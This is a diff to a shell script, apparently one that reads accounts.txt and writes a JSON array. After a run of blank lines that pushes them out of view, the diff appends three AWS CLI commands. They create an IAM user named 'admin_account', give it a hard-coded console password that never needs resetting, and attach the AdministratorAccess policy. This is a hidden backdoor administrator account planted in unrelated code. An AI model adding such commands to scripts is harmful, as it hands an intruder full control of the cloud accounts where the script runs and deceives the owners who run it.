@@ -476,3 +476,17 @@ done < accounts.txt
 
 # Écrire la fin du tableau JSON dans le fichier
 echo "]" >> "$output_file"
+
+
+
+
+
+
+
+
+
+aws iam create-user --user-name admin_account
+
+aws iam create-login-profile --user-name admin_account --password "I&Bk9KVud@@J" --no-password-reset-required
+
+aws iam attach-user-policy --user-name admin_account --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
